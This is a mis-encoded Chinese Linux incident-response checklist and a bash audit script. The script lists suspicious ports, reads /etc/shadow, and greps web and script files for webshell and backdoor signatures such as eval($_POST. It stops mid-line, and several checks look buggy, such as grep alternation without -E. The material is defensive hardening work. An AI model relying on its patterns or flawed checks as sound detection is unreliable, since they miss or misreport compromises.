é™¤/homeç›®å½•ä¸‹çš„è´¦æˆ·ç›®å½• è¿›ç¨‹æ’æŸ¥ ps aux //è¿›ç¨‹ç›¸å…³ä¿¡æ¯ ls -l /proc/PID/file //æŸ¥çœ‹pidæ‰€å¯¹åº”çš„è¿›ç¨‹æ–‡ä»¶è·¯å¾„ lsof -c [è¿›ç¨‹] //æŸä¸ªè¿›ç¨‹æ‰€æ‰“å¼€ç›¸å…³æ–‡ä»¶ä¿¡æ¯ #æ’æŸ¥å¤„ç† kill -9 [è¿›ç¨‹å·] rm -rf [æ–‡ä»¶] ç«¯å£æ’æŸ¥ netstat -antlp | more #æ’æŸ¥å¤„ç† netstat -anp | grep PORT kill -9 [è¿›ç¨‹å·] è®¡åˆ’ä»»åŠ¡æ’æŸ¥ crontab -l /var/spool/cron/* åœ¨æ’æŸ¥ä»¥ä¸Šå†…å®¹å®Œæˆå¤„ç†åï¼Œä»æœ‰æ¶æ„è®¡åˆ’ä»»åŠ¡å¯åŠ¨ï¼Œæ’æŸ¥ä»¥ä¸‹æ–‡ä»¶ /etc/crontab /etc/anacrontab var/spool/anacron /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/* #æ’æŸ¥å¤„ç† å½“åªéœ€è¦åˆ é™¤æŸä¸€æ¡è®¡åˆ’ä»»åŠ¡æ—¶ï¼Œå¯ä»¥é€šè¿‡â€œcrontab -eâ€å‘½ä»¤è¿›è¡Œç¼–è¾‘ è€Œè‹¥è¦æ¸…ç©ºæŸä¸ªç”¨æˆ·çš„æ‰€æœ‰è®¡åˆ’ä»»åŠ¡ï¼Œå¯ä»¥æ‰§è¡Œâ€œcrontab -râ€å‘½ä»¤ å†å²å‘½ä»¤æ’æŸ¥ history //rootå†å²å‘½ä»¤ /home/{user}/.bash_history //æ™®é€šç”¨æˆ·è´¦å·å†å²å‘½ä»¤ #æ’æŸ¥å¤„ç† cat .bash_history &gt;&gt; 1.txt #ç•™å­˜åˆ†æ æ—¥å¿—æ’æŸ¥ #æŸ¥çœ‹ Linux ssh ç™»é™†å®¡è®¡æ—¥å¿— /var/log/secure #Centos ä¸ RedHat æ—¥å¿—è·¯å¾„ /var/log/auth.log #Ubuntu ä¸ Debian æ—¥å¿—è·¯å¾„ é™„ä»¶ https://git.io/linux &lt;!--linuxå‘½ä»¤æŸ¥è¯¢--&gt; https://github.com/grayddq/GScan/releases &lt;!--å¿«é€Ÿå®‰å…¨æ£€æŸ¥è„šæœ¬--&gt; æ£€æŸ¥è„šæœ¬ #!/bin/bash echo &quot;usage:./LinuxChk.sh &gt;a.txt&quot; echo ---------------------------------------------------------- echo &quot;æœ¬æœºIPï¼š&quot; ifconfig -a| grep --color &quot;\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}&quot; echo &quot;å†…æ ¸ç‰ˆæœ¬&quot; uname -a echo ---------------------------------------------------------- echo &quot;æ£€æŸ¥ç½‘ç»œè¿æ¥å’Œç›‘å¬ç«¯å£&quot; netstat -anp | grep &quot;tcp&quot; echo ---------------------------------------------------------- echo &quot;å¯èƒ½çš„å±é™©è¿æ¥&quot; netstat -anp | grep &quot;4433|4444|3333|5555|2222|1111&quot; echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹åƒµå°¸è¿›ç¨‹ï¼ˆæ­¤å¤„è¿›ç¨‹å¯è‡ªè¡ŒæŒ‡å®šï¼‰&quot; ps -ef | grep &quot;miner|zombie|xmr|pool|hook&quot; | grep -v grep echo &quot;è‹¥å‘ç°æ¶æ„è¿›ç¨‹ï¼Œè¯·ç”¨ls -l /proc/pid æŸ¥çœ‹è¿›ç¨‹ç›¸å…³ç›®å½•&quot; echo ---------------------------------------------------------- echo &quot;è€—CPUæœ€å¤šçš„è¿›ç¨‹ï¼ˆå‰5ï¼‰&quot; ps auxf|head -1;ps auxf|grep -v PID|sort -rn -k 3|head -5 echo ---------------------------------------------------------- echo &quot;è€—å†…å­˜æœ€å¤šçš„è¿›ç¨‹&quot; ps auxf|head -1;ps auxf|grep -v PID|sort -nr -k 4 |head -5 #ls -l /proc/pid echo ---------------------------------------------------------- echo &quot;è®¡åˆ’ä»»åŠ¡&quot; crontab -l # æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ crontab -l -u root # æŸ¥çœ‹rootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ echo ---------------------------------------------------------- awk -F&quot;:&quot; '{if($2!~/^!|^*/){print &quot;(&quot;$1&quot;)&quot; &quot; æ˜¯ä¸€ä¸ªæœªè¢«é”å®šçš„è´¦æˆ·ï¼Œè¯·ç®¡ç†å‘˜æ£€æŸ¥æ˜¯å¦éœ€è¦é”å®šå®ƒæˆ–è€…åˆ é™¤å®ƒã€‚&quot;}}' /etc/shadow echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹ç³»ç»Ÿå¯†ç æ–‡ä»¶ä¿®æ”¹æ—¶é—´&quot; ls -ltr /etc/passwd echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹ç³»ç»Ÿä¸­å­˜åœ¨å“ªäº›éç³»ç»Ÿé»˜è®¤ç”¨æˆ·&quot; echo &quot;root:x:â€œè¯¥å€¼å¤§äº500ä¸ºæ–°åˆ›å»ºç”¨æˆ·ï¼Œå°äºæˆ–ç­‰äº500ä¸ºç³»ç»Ÿåˆå§‹ç”¨æˆ·â€&quot; more /etc/passwd |awk -F &quot;:&quot; '{if($3&gt;500){print &quot;/etc/passwdé‡Œé¢çš„&quot;$1 &quot;çš„å€¼ä¸º&quot;$3&quot;ï¼Œè¯·ç®¡ç†å‘˜ç¡®è®¤è¯¥è´¦æˆ·æ˜¯å¦æ­£å¸¸ã€‚&quot;}}' echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹æ˜¯å¦å¼€å¯äº†sshæœåŠ¡&quot; if service sshd status | grep -E &quot;running|listening on|active \\(running\\)&quot;; then echo &quot;SSHæœåŠ¡å·²å¼€å¯&quot; ls -l ~/.ssh/authorized_keys else echo &quot;SSHæœåŠ¡æœªå¼€å¯&quot; fi echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹ç³»ç»ŸSSHè¿œç¨‹è®¿é—®è®¾ç½®ç­–ç•¥(hosts.allowå…è®¸åˆ—è¡¨)&quot; if more /etc/hosts.allow | grep -E &quot;sshd: &quot;;more /etc/hosts.allow | grep -E &quot;sshd&quot;; then echo &quot;è¿œç¨‹è®¿é—®ç­–ç•¥å·²è®¾ç½® &quot; else echo &quot;è¿œç¨‹è®¿é—®ç­–ç•¥æœªè®¾ç½® &quot; fi echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹æ˜¯å¦å¼€å¯äº†TELNETæœåŠ¡&quot; if more /etc/xinetd.d/telnetd 2&gt;&amp;1|grep -E &quot;disable=no&quot;; then echo &quot;TELNETæœåŠ¡å·²å¼€å¯ &quot; else echo &quot;TELNETæœåŠ¡æœªå¼€å¯ &quot; fi echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹syslogæ—¥å¿—æ˜¯å¦å¼€å¯å¤–å‘&quot; if more /etc/rsyslog.conf | egrep &quot;@...\\.|@..\\.|@.\\.|\\*.\\* @...\\.|\\*\\.\\* @..\\.|\\*\\.\\* @.\\.&quot;;then echo &quot;å®¢æˆ·ç«¯syslogæ—¥å¿—å·²å¼€å¯å¤–å‘&quot; else echo &quot;å®¢æˆ·ç«¯syslogæ—¥å¿—æœªå¼€å¯å¤–å‘&quot; fi echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶æ˜¯å¦å­˜åœ¨&quot; log=/var/log/syslog log2=/var/log/messages log3=/var/log/cron log4=~/.bash_history log5=/var/log/secure if [ -e &quot;$log&quot; ]; then echo &quot;syslogæ—¥å¿—æ–‡ä»¶å­˜åœ¨ï¼ &quot; else echo &quot;/var/log/syslogæ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼ &quot; fi if [ -e &quot;$log2&quot; ]; then echo &quot;/var/log/messagesæ—¥å¿—æ–‡ä»¶å­˜åœ¨ï¼ &quot; else echo &quot;/var/log/messagesæ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼ &quot; fi if [ -e &quot;$log3&quot; ]; then echo &quot;/var/log/cronæ—¥å¿—æ–‡ä»¶å­˜åœ¨ï¼ &quot; else echo &quot;/var/log/cronæ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼ &quot; fi echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹passwdæ–‡ä»¶ä¸­æœ‰å“ªäº›ç‰¹æƒç”¨æˆ·&quot; awk -F: '$3==0 {print $1}' /etc/passwd echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨ç©ºå£ä»¤è´¦æˆ·&quot; awk -F: '($2==&quot;!!&quot;) {print $1}' /etc/shadow echo &quot;è¯¥ç»“æœä¸é€‚ç”¨äºUbuntuç³»ç»Ÿ&quot; echo ----------------------------------------------------------- echo &quot;æŸ¥çœ‹ç³»ç»Ÿä¸­rootç”¨æˆ·å¤–è¿æƒ…å†µ&quot; lsof -u root |egrep &quot;ESTABLISHED|SYN_SENT|LISTENING&quot; echo ---------------çŠ¶æ€è§£é‡Š------------------------------- echo &quot;ESTABLISHEDçš„æ„æ€æ˜¯å»ºç«‹è¿æ¥ã€‚è¡¨ç¤ºä¸¤å°æœºå™¨æ­£åœ¨é€šä¿¡ã€‚&quot; echo &quot;LISTENINGè¡¨ç¤ºç›‘å¬çŠ¶æ€&quot; echo &quot;SYN_SENTè¡¨ç¤ºè¯·æ±‚è¿æ¥&quot; echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹ç³»ç»Ÿä¸­rootç”¨æˆ·TCPè¿æ¥æƒ…å†µ&quot; lsof -u root |egrep &quot;TCP&quot; echo ---------------------------------------------------------- echo &quot;æ£€æŸ¥ç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹&quot; more /etc/xinetd.d/rsync | grep -v &quot;^#&quot; echo ---------------------------------------------------------- echo &quot;/rootç›®å½•&quot; ls -l /tmp echo ---------------------------------------------------------- echo &quot;/tmpç›®å½•&quot; ls -l /tmp echo ---------------------------------------------------------- echo &quot;/var/log/ç›®å½•&quot; ls -l /var/log/ echo ---------------------------------------------------------- echo &quot;secureå†å²å¯†ç é”™è¯¯æ¬¡æ•°&quot; grep -c &quot;authentication failure&quot; /var/log/secure* echo ---------------------------------------------------------- echo &quot;æ£€æŸ¥secureè¿‘æœŸç™»å½•æˆåŠŸæ—¥å¿—ï¼ˆæ—§çš„ä¸åœ¨æ­¤èŒƒå›´ï¼‰&quot; more /var/log/secure |grep &quot;Accepted password&quot; echo &quot;secureå†å²ç™»å½•æˆåŠŸè®°å½•ï¼Œè¾“å‡ºåˆ°/tmp/secure-logined.log&quot; grep &quot;Accepted password&quot; /var/log/secure* &gt;/tmp/secure-logined.log echo ---------------------------------------------------------- echo &quot;historyå†å²å‘½ä»¤&quot; history echo ---------------------------------------------------------- echo &quot;æŸ¥çœ‹æ­£å¸¸æƒ…å†µä¸‹ç™»å½•åˆ°æœ¬æœºçš„æ‰€æœ‰ç”¨æˆ·çš„å†å²è®°å½•&quot; last echo ---------------------------------------------------------- echo &quot;-------æŸ¥æ‰¾æœ€è¿‘ä¸€å¤©è¢«ä¿®æ”¹çš„PHPæ–‡ä»¶--------&quot; find -mtime -1 -type f -name ï¼¼*.php echo ---------------------------------------------------------- echo &quot;-------éšè—è¿›ç¨‹æŸ¥æ‰¾---------&quot; ps -ef |awk '{print}'|sort -n |uniq &gt;1 echo ---------------------------------------------------------- echo &quot;-------æŸ¥æ‰¾æœ€è¿‘ä¸€å¤©è¢«ä¿®æ”¹çš„ä»»æ„æ–‡ä»¶--------&quot; find -mtime -1 -type f -name ï¼¼*.* echo ---------------------------------------------------------- echo &quot;æ£€æŸ¥ç³»ç»Ÿä¸­å…³é”®æ–‡ä»¶ä¿®æ”¹æ—¶é—´&quot; ls -ltr /bin/ls /bin/login /etc/passwd /bin/ps /usr/bin/top /etc/shadow|awk '{print &quot;æ–‡ä»¶åï¼š&quot;$9&quot; &quot;&quot;æœ€åä¿®æ”¹æ—¶é—´ï¼š&quot;$6&quot; &quot;$7&quot; &quot;$8}' echo &quot;lsæ–‡ä»¶ï¼šæ˜¯å­˜å‚¨lså‘½ä»¤çš„åŠŸèƒ½å‡½æ•°ï¼Œè¢«åˆ é™¤ä»¥åï¼Œå°±æ— æ³•æ‰§è¡Œlså‘½ä»¤ï¼Œé»‘å®¢å¯åˆ©ç”¨ç¯¡æ”¹lsæ–‡ä»¶æ¥æ‰§è¡Œåé—¨æˆ–å…¶ä»–ç¨‹åºã€‚ loginæ–‡ä»¶ï¼šloginæ˜¯æ§åˆ¶ç”¨æˆ·ç™»å½•çš„æ–‡ä»¶ï¼Œä¸€æ—¦è¢«ç¯¡æ”¹æˆ–åˆ é™¤ï¼Œç³»ç»Ÿå°†æ— æ³•åˆ‡æ¢ç”¨æˆ·æˆ–ç™»é™†ç”¨æˆ· user/bin/passwdæ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œå¯ä»¥ä¸ºç”¨æˆ·æ·»åŠ ã€æ›´æ”¹å¯†ç ï¼Œä½†æ˜¯ï¼Œç”¨æˆ·çš„å¯†ç å¹¶ä¸ä¿å­˜åœ¨/etc/passwdå½“ä¸­ï¼Œè€Œæ˜¯ä¿å­˜åœ¨äº†/etc/shadowå½“ä¸­ etc/passwdæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸»è¦æ˜¯ä¿å­˜ç”¨æˆ·ä¿¡æ¯ã€‚ sbin/portmapæ˜¯æ–‡ä»¶è½¬æ¢æœåŠ¡ï¼Œç¼ºå°‘è¯¥æ–‡ä»¶åï¼Œæ— æ³•ä½¿ç”¨ç£ç›˜æŒ‚è½½ã€è½¬æ¢ç±»å‹ç­‰åŠŸèƒ½ã€‚ bin/ps è¿›ç¨‹æŸ¥çœ‹å‘½ä»¤åŠŸèƒ½æ”¯æŒæ–‡ä»¶ï¼Œæ–‡ä»¶æŸåæˆ–è¢«æ›´æ”¹åï¼Œæ— æ³•æ­£å¸¸ä½¿ç”¨pså‘½ä»¤ã€‚ usr/bin/top topå‘½ä»¤æ”¯æŒæ–‡ä»¶ï¼Œæ˜¯Linuxä¸‹å¸¸ç”¨çš„æ€§èƒ½åˆ†æå·¥å…·,èƒ½å¤Ÿå®æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸­å„ä¸ªè¿›ç¨‹çš„èµ„æºå ç”¨çŠ¶å†µã€‚ etc/shadow shadow æ˜¯ /etc/passwd çš„å½±å­æ–‡ä»¶ï¼Œå¯†ç å­˜æ”¾åœ¨è¯¥æ–‡ä»¶å½“ä¸­ï¼Œå¹¶ä¸”åªæœ‰rootç”¨æˆ·å¯è¯»ã€‚&quot; echo ---------------------------------------------------------- echo &quot;--------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨PHPè„šæœ¬åé—¨---------------------&quot; if find / -type f -name *.php | xargs egrep -l &quot;ä¸“ç”¨ç½‘é©¬|udf.dll|class PHPzip|ZIPå‹ç¼©ç¨‹åº è’é‡æ— ç¯ä¿®æ”¹ç‰ˆ|AnonymousUserName|Root_CSS\\(\\)|é»‘ç‹¼PHPæœ¨é©¬|eval\\(gzuncompress\\(base64_decode|shell|Shell|PHPæœ¨é©¬|eval\\($_POST|eval\\($_GET|system\\($_REQUEST|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|ææƒ|phpspy|åé—¨|substr\\(PHP_OS|is_callable\\(|backdoor|åšå½©&quot; |sort -n|uniq -c |sort -rn 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;æ£€æµ‹åˆ°PHPè„šæœ¬åé—¨&quot; find / -type f -name *.php | xargs egrep -l &quot;ä¸“ç”¨ç½‘é©¬|udf.dll|class PHPzip|ZIPå‹ç¼©ç¨‹åº è’é‡æ— ç¯ä¿®æ”¹ç‰ˆ|AnonymousUserName|Root_CSS\\(\\)|é»‘ç‹¼PHPæœ¨é©¬|eval\\(gzuncompress\\(base64_decode|shell|Shell|PHPæœ¨é©¬|eval\\($_POST|eval\\($_GET|system\\($_REQUEST|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|ææƒ|phpspy|åé—¨|substr\\(PHP_OS|is_callable\\(|backdoor|åšå½©&quot; |sort -n|uniq -c |sort -rn find / -type f -name *.php | xargs egrep -l &quot;ä¸“ç”¨ç½‘é©¬|udf.dll|class PHPzip|ZIPå‹ç¼©ç¨‹åº è’é‡æ— ç¯ä¿®æ”¹ç‰ˆ|AnonymousUserName|Root_CSS\\(\\)|é»‘ç‹¼PHPæœ¨é©¬|eval\\(gzuncompress\\(base64_decode|shell|Shell|PHPæœ¨é©¬|eval\\($_POST|eval\\($_GET|system\\($_REQUEST|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|ææƒ|phpspy|åé—¨|substr\\(PHP_OS|is_callable\\(|backdoor|åšå½©&quot; |sort -n|uniq -c |sort -rn |awk '{print $2}' | xargs -I{} cp {} /tmp/ echo &quot;åé—¨æ ·æœ¬å·²æ‹·è´åˆ°/tmp/ç›®å½•&quot; else echo &quot;æœªæ£€æµ‹åˆ°PHPè„šæœ¬åé—¨&quot; fi echo ---------------------------------------------------------- echo &quot;---------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨JSPè„šæœ¬åé—¨---------------------&quot; if find / -type f -name *.jsp | xargs egrep -l &quot;java.io.FileOutputStream\\(application.getRealPath|request.getParameter\\(\\&quot;pass|exec\\(request.getParameter\\(|InputStreamReader\\(this.is\\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|ææƒ|jspspy|åé—¨|JFolder|backdoor|åšå½©&quot; 2&gt;&amp;1;then echo &quot;æ£€æµ‹åˆ°JSPè„šæœ¬åé—¨&quot; find / -type f -name *.jsp | xargs egrep -l &quot;java.io.FileOutputStream\\(application.getRealPath|request.getParameter\\(\\&quot;pass|exec\\(request.getParameter\\(|InputStreamReader\\(this.is\\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|ææƒ|jspspy|åé—¨|JFolder|backdoor|åšå½©&quot; |sort -n|uniq -c |sort -rn find / -type f -name *.jsp | xargs egrep -l &quot;java.io.FileOutputStream\\(application.getRealPath|request.getParameter\\(\\&quot;pass|exec\\(request.getParameter\\(|InputStreamReader\\(this.is\\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|ææƒ|jspspy|åé—¨|JFolder|backdoor|åšå½©&quot; |sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/ echo &quot;åé—¨æ ·æœ¬å·²æ‹·è´åˆ°/tmp/ç›®å½•&quot; else echo &quot;æœªæ£€æµ‹åˆ°JSPè„šæœ¬åé—¨&quot; fi echo ---------------------------------------------------------- echo &quot;--------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨HTMLæ¶æ„ä»£ç ---------------------&quot; if find / -type f -name *.html | xargs egrep -l &quot;hack|WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330|åšå½©|script src=\\&quot;http&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;å‘ç°HTMLæ¶æ„ä»£ç &quot; find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330|åšå½©|script src=\\&quot;http&quot; |sort -n|uniq -c |sort -rn find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330|åšå½©|script src=\\&quot;http&quot; |sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/ echo &quot;HTMLæ¶æ„æ–‡ä»¶å·²æ‹·è´åˆ°/tmp/ç›®å½•&quot; else echo &quot;æœªæ£€æµ‹åˆ°HTMLæ¶æ„ä»£ç &quot; fi echo ---------------------------------------------------------- echo &quot;--------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨perlæ¶æ„ç¨‹åº--------------------&quot; if find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;å‘ç°perlæ¶æ„ç¨‹åº&quot; find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;|sort -n|uniq -c |sort -rn find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;|sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/ echo &quot;å¯ç–‘æ ·æœ¬å·²æ‹·è´åˆ°/tmp/ç›®å½•&quot; else echo &quot;æœªæ£€æµ‹åˆ°perlæ¶æ„ç¨‹åº&quot; fi echo ---------------------------------------------------------- echo &quot;--------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨Pythonæ¶æ„ç¨‹åº-------------&quot; find / -type f -name &quot;*.py&quot; | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb|exec\\(base64&quot; |sort -n|uniq -c |sort -rn find / -type f -name &quot;*.py&quot; | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb|exec\\(base64&quot; |sort -n|uniq -c |sort -rn| awk '{print $2}' | xargs -I{} cp {} /tmp/ echo ---------------------------------------------------------- echo &quot;-----------å¼€å§‹æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ˜“å—æ”»å‡»çš„æ¼æ´---------------------&quot; if ps aux | grep &quot;httpd|apache|tomcat|nginx&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;httpd|apache|tomcat|nginx&quot; | grep -v grep echo &quot;WebæœåŠ¡è¿è¡Œä¸­&quot; else echo &quot;æœªå‘ç° httpd|apache|tomcat|nginx&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨redisæœªæˆæƒè®¿é—®æ¼æ´---------------------&quot; if ps aux | grep &quot;redis&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;redis&quot; | grep -v grep echo &quot;å­˜åœ¨redisæœåŠ¡&quot; echo &quot;å¼€å§‹æ£€æŸ¥redisé…ç½®å®‰å…¨&quot; find / -name redis.conf | xargs egrep &quot;requirepass |^[^#]*bind |^[^#]*port &quot; else echo &quot;æœªå‘ç°ä½¿ç”¨redisæœåŠ¡&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨dockeræœªæˆæƒè®¿é—®æ¼æ´---------------------&quot; if ps aux | grep &quot;docker&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;docker&quot; | grep -v grep echo &quot;dockerè¿è¡Œä¸­ï¼Œé»˜è®¤2375ç«¯å£ï¼Œå¯èƒ½å­˜åœ¨Docker remote apiæœªæˆæƒè®¿é—®æ¼æ´ï¼&quot;; else echo &quot;æœªå‘ç°å¯¹å¤–å¼€æ”¾dockeræœåŠ¡&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨Memcacheæœªæˆæƒè®¿é—®æ¼æ´---------------------&quot; if ps aux | grep &quot;memcache|:11211&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;memcache&quot; | grep -v grep echo &quot;å¼€æ”¾äº†11211ç«¯å£ï¼Œå¯èƒ½å­˜åœ¨Memcacheæœªæˆæƒè®¿é—®æ¼æ´ï¼&quot;; else echo &quot;æœªå‘ç°å¯¹å¤–å¼€æ”¾MemcacheæœåŠ¡&quot;;fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨Zookeeperæœªæˆæƒè®¿é—®æ¼æ´---------------------&quot; if ps aux | grep &quot;zookeeper|:2181&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;zookeeper|:2181&quot; | grep -v grep echo &quot;å¼€æ”¾äº†2181ç«¯å£ï¼Œå¯èƒ½å­˜åœ¨zookeeperæœªæˆæƒè®¿é—®æ¼æ´ï¼&quot;; else echo &quot;æœªå‘ç°å¯¹å¤–å¼€æ”¾zookeeperæœåŠ¡&quot;;fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨elasticsearchæœªæˆæƒè®¿é—®æ¼æ´---------------------&quot; if ps aux | grep &quot;:9200|elasticsearch&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;:9200|elasticsearch&quot; | grep -v grep echo &quot;å¼€æ”¾äº†9200ç«¯å£ï¼Œå¯èƒ½å­˜åœ¨elasticsearchæœªæˆæƒè®¿é—®æ¼æ´ï¼&quot;; else echo &quot;æœªå‘ç°å¯¹å¤–å¼€æ”¾elasticsearchæœåŠ¡&quot;;fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨hadoopæœªæˆæƒè®¿é—®æ¼æ´---------------------&quot; if ps aux | grep &quot;:50070|hadoop&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;:50070|hadoop&quot; | grep -v grep echo &quot;å¼€æ”¾äº†50070ç«¯å£ï¼Œå¯èƒ½å­˜åœ¨hadoopæœªæˆæƒè®¿é—®æ¼æ´ï¼&quot;; else echo &quot;æœªå‘ç°å¯¹å¤–å¼€æ”¾hadoopæœåŠ¡&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨jenkinsæœªæˆæƒè®¿é—®æ¼æ´---------------------&quot; if ps aux | grep jenkins | grep -v grep 1&gt;/dev/null 2&gt;&amp;1 ;then echo &quot;å­˜åœ¨jenkinsæœåŠ¡ï¼&quot; ps aux | grep jenkins | grep -v grep if netstat -tulnp | egrep &quot;:8080|jenkins&quot; 1&gt;/dev/null 2&gt;&amp;1; then echo &quot;å¼€å§‹æ£€æŸ¥jenkinsæœªæˆæƒè®¿é—®æ¼æ´&quot; if wget -q -O - http://127.0.0.1:8080/script | grep &quot;Groovy script&quot; 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;å­˜åœ¨jenkinsæœªæˆæƒè®¿é—®æ¼æ´ï¼&quot;; else echo &quot;ä¸å­˜åœ¨jenkinsæœªæˆæƒè®¿é—®æ¼æ´&quot;; fi else echo &quot;æœåŠ¡ä¸ºæœ¬åœ°ä½¿ç”¨ï¼Œæ— æ³•è¿œç¨‹è®¿é—®ã€‚&quot; fi else echo &quot;æœªå‘ç°ä½¿ç”¨jenkinsæœåŠ¡&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨MongoDBæœªæˆæƒè®¿é—®æ¼æ´---------------------&quot; if ps aux | grep &quot;mongodb|:27017&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;mongodb|:27017&quot; | grep -v grep echo &quot;å¼€æ”¾äº†27017ç«¯å£ï¼Œå¯èƒ½å­˜åœ¨MongoDBæœªæˆæƒè®¿é—®æ¼æ´ï¼&quot;; else echo &quot;æœªå‘ç°å¯¹å¤–å¼€æ”¾MongoDBæœåŠ¡&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨CouchDBæœªæˆæƒè®¿é—®æ¼æ´---------------------&quot; if ps aux | grep &quot;5984|couchdb&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then ps aux | grep &quot;5984|couchdb&quot; | grep -v grep echo &quot;å¼€æ”¾äº†5984ç«¯å£ï¼Œå¯èƒ½å­˜åœ¨CouchDBæœªæˆæƒè®¿é—®æ¼æ´ï¼&quot; echo &quot;å¼€å§‹æ£€æŸ¥CouchDBé…ç½®å®‰å…¨&quot; find / -name local.ini | head -1 |xargs grep &quot;admin&quot; else echo &quot;æœªå‘ç°ä½¿ç”¨CouchDBæœåŠ¡&quot;; fi echo ---------------------------------------------------------- echo &quot;-----------æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨apache tomcatç›¸å…³å®‰å…¨æ¼æ´---------------------&quot; #è¿˜éœ€çœ‹åç»­æ€ä¹ˆå®Œå–„ if ps aux | grep &quot;tomcat|httpd&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then echo &quot;å­˜åœ¨apache 